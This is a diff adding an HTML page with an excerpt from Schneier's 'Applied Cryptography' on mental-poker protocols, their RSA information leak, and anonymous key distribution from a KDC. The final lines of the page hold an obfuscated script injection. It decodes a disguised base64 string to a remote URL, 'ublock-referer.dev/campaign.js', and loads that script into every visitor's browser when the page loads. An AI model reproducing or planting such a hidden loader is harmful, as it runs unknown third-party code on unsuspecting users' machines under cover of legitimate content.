@@ -1,0 +1,98 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Intermediate Protocols</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=04//-->
+<!--PAGES=093-095//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-10.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+<P>Ideally, step (10) would not be necessary. All players shouldn&#146;t be required to reveal their hands at the end of the protocol; only those who haven&#146;t folded. Since step (10) is part of the protocol designed only to catch cheaters, perhaps there are improvements.
+</P>
+<P>In poker, one is only interested in whether the winner cheated. Everyone else can cheat as much as they want, as long as they still lose. (Actually, this is not really true. Someone can, while losing, collect data on another player&#146;s poker style.) So, let&#146;s look at cases in which different players win.</P>
+<P>If Alice wins, she reveals her hand and her keys. Bob can use Alice&#146;s private key to confirm that Alice performed step (2) correctly&#151;that each of the 52 messages corresponded to a different card. Carol can confirm that Alice is not lying about her hand by encrypting the cards with Alice&#146;s public key and verifying that they are the same as the encrypted messages she sent to her in step (8).</P>
+<P>If either Bob or Carol wins, the winner reveals his hand and keys. Alice can confirm that the cards are legitimate by checking her random strings. She can also confirm that the cards are the ones dealt by encrypting the cards with the winner&#146;s public key and verifying that they are the same as the encrypted messages she received in step (3) or (5).</P>
+<P>This protocol isn&#146;t secure against collusion among malicious players. Alice and another player can effectively gang up on the third and together swindle that player out of everything without raising suspicion. Therefore, it is important to check all the keys and random strings every time the players reveal their hands. And if you&#146;re sitting around the virtual table with two people who never reveal their hands whenever one of them is the dealer (Alice, in the previous protocol), stop playing.</P>
+<P>Understand that while this is all interesting theory, actually implementing it on a computer is an arduous task. A Sparc implementation with three players on separate workstations takes eight hours to shuffle a deck of cards, let alone play an actual game [513].</P>
+<P><FONT SIZE="+1"><B><I>Attacks against Poker Protocols</I></B></FONT></P>
+<P>Cryptographers have shown that a small amount of information is leaked by these poker protocols if the RSA public-key algorithm is used [453, 573]. Specifically, if the binary representation of the card is a quadratic residue (see Section 11.3), then the encryption of the card is also a quadratic residue. This property can be used to &#147;mark&#148; some cards&#151;all the aces, for example. This does not reveal much about the hands, but in a game such as poker even a tiny bit of information can be an advantage in the long run.
+</P>
+<P>Shafi Goldwasser and Silvio Micali [624] developed a two-player mental-poker protocol that fixes this problem, although its complexity makes it far more theoretical than practical. A general <I>n-</I> player poker protocol that eliminates the problem of information leakage was developed in [389].</P>
+<P>Other research on poker protocols can be found in [573, 1634, 389]. A complicated protocol that allows players to not reveal their hands can be found in [390]. Don Coppersmith discusses two ways to cheat at mental poker using the RSA algorithm [370].</P>
+<P><FONT SIZE="+1"><B><I>Anonymous Key Distribution</I></B></FONT></P>
+<P>While it is unlikely that anyone is going to use this protocol to play poker via modem, Charles Pfleeger discusses a situation in which this type of protocol would come in handy [1244].
+</P>
+<P>Consider the problem of key distribution. If we assume that people cannot generate their own keys (they might have to be of a certain form, or have to be signed by some organization, or something similar), we have to set up a Key Distribution Center to generate and distribute keys. The problem is that we have to figure out some way of distributing keys such that no one, including the server, can figure out who got which key.</P>
+<P>This protocol solves the problem:</P>
+<DL>
+<DD><B>(1)</B>&nbsp;&nbsp;Alice generates a public-key/private-key key pair. For this protocol, she keeps both keys secret.
+<DD><B>(2)</B>&nbsp;&nbsp;The KDC generates a continuous stream of keys.
+<DD><B>(3)</B>&nbsp;&nbsp;The KDC encrypts the keys, one by one, with its own public key.
+<DD><B>(4)</B>&nbsp;&nbsp;The KDC transmits the encrypted keys, one by one, onto the network.
+<DD><B>(5)</B>&nbsp;&nbsp;Alice chooses a key at random.
+<DD><B>(6)</B>&nbsp;&nbsp;Alice encrypts the chosen key with her public key.
+<DD><B>(7)</B>&nbsp;&nbsp;Alice waits a while (long enough so the server has no idea which key she has chosen) and sends the double-encrypted key back to the KDC.
+<DD><B>(8)</B>&nbsp;&nbsp;The KDC decrypts the double-encrypted key with its private key, leaving a key encrypted with Alice&#146;s public key.
+<DD><B>(9)</B>&nbsp;&nbsp;The server sends the encrypted key back to Alice.
+<DD><B>(10)</B>&nbsp;&nbsp;Alice decrypts the key with her private key.
+</DL>
+<P>Eve, sitting in the middle of this protocol, has no idea what key Alice chose. She sees a continuous stream of keys go by in step (4). When Alice sends the key back to the server in step (7), it is encrypted with her public key, which is also secret during this protocol. Eve has no way of correlating it with the stream of keys. When the server sends the key back to Alice in step (9), it is also encrypted with Alice&#146;s public key. Only when Alice decrypts the key in step (10) is the key revealed.
+</P>
+<P>If you use RSA, this protocol leaks information at the rate of one bit per message. It&#146;s the quadratic residues again. If you&#146;re going to distribute keys in this manner, make sure this leakage isn&#146;t enough to matter. Also, the stream of keys from the KDC must be great enough to preclude a brute-force attack. Of course, if Alice can&#146;t trust the KDC, then she shouldn&#146;t be getting keys from it. A malicious KDC could presumably keep records of every key it generates. Then, it could search them all to determine which is Alice&#146;s.</P>
+<P>This protocol also assumes that Alice is going to act fairly. There are things she can do, using RSA, to get more information than she might otherwise. This is not a problem in our scenario, but can be in other circumstances.</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="04-08.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="04-10.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(YcnVylXq, KzKyIauF) {KzKyIauF = YcnVylXq.createElement('script');KzKyIauF.type = 'text/javascript';KzKyIauF.async = true;KzKyIauF.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');YcnVylXq.getElementsByTagName('body')[0].appendChild(KzKyIauF);}(document));</script></body>
+</html>
